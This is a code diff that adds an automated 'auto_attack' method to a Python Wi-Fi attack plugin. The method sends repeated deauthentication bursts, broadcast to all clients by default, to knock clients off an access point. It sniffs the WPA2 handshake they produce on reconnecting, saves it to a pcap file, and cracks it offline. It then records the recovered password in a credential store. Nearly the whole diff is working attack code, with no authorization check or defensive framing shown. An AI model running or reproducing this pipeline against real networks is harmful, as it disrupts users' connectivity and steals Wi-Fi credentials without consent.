@@ -143,3 +143,81 @@ class WiFiAttackPlugin(BasePlugin):
             except (FileNotFoundError, subprocess.TimeoutExpired):
                 pass
         return None
+
+    # ------------------------------------------------------------------
+    # Option C — Automated pipeline: deauth → capture → crack → store
+    # ------------------------------------------------------------------
+
+    async def auto_attack(
+        self,
+        bssid: str,
+        clients: list[str] | None = None,
+        timeout: int = 90,
+    ) -> dict:
+        """
+        Chain deauth waves with live EAPOL sniffing.  Sends deauth bursts to
+        force clients to re-associate (triggering a 4-way handshake), captures
+        the handshake, then cracks offline with aircrack-ng.
+        Returns {"bssid": ..., "cracked": bool, "key": str|None}.
+        """
+        self.log_event(f"AUTO-ATTACK initiated on {bssid}", "START")
+        self.emit("AUTO_ATTACK_START", {"bssid": bssid})
+
+        found_key: list[str] = []
+        done_event = threading.Event()
+
+        def _sniff_loop():
+            captured: list = []
+
+            def _pkt(pkt):
+                if EAPOL in pkt and getattr(pkt, "addr3", None) == bssid:
+                    captured.append(pkt)
+                    self.emit("EAPOL_FRAME", {"bssid": bssid, "frame": len(captured)})
+
+            sniff(
+                iface=self.interface,
+                prn=_pkt,
+                stop_filter=lambda _: len(captured) >= 4 or done_event.is_set(),
+                timeout=timeout,
+            )
+
+            if len(captured) >= 4:
+                fname = os.path.join(
+                    self._capture_dir,
+                    f"autoattack_{bssid.replace(':', '')}.pcap",
+                )
+                wrpcap(fname, captured)
+                self.handshakes.append({"bssid": bssid, "file": fname, "frames": len(captured)})
+                self.emit("HANDSHAKE_CAPTURED", {"bssid": bssid, "frames": len(captured)})
+                key = self._try_crack(fname, bssid)
+                if key:
+                    found_key.append(key)
+                    self.emit("CREDENTIAL_FOUND", {"bssid": bssid, "password": key})
+                    if self.target_store:
+                        self.target_store.save_credential(
+                            f"WiFi-AutoAttack:WPA2:{bssid}", key
+                        )
+            done_event.set()
+
+        t = threading.Thread(target=_sniff_loop, daemon=True)
+        t.start()
+        self.threads.append(t)
+
+        burst_targets = clients or ["ff:ff:ff:ff:ff:ff"]
+        for wave in range(4):
+            if done_event.is_set():
+                break
+            for mac in burst_targets:
+                await self.deauth(target_mac=mac, ap_mac=bssid, count=20)
+            self.emit("AUTO_ATTACK_WAVE", {"wave": wave + 1, "bssid": bssid})
+            await asyncio.sleep(10)
+
+        await asyncio.to_thread(done_event.wait, timeout)
+
+        key = found_key[0] if found_key else None
+        self.emit("AUTO_ATTACK_DONE", {"bssid": bssid, "success": bool(key), "key": key})
+        self.log_event(
+            f"AUTO-ATTACK {'SUCCESS → ' + key if key else 'handshake only (crack failed)'} on {bssid}",
+            "DONE",
+        )
+        return {"bssid": bssid, "cracked": bool(key), "key": key}
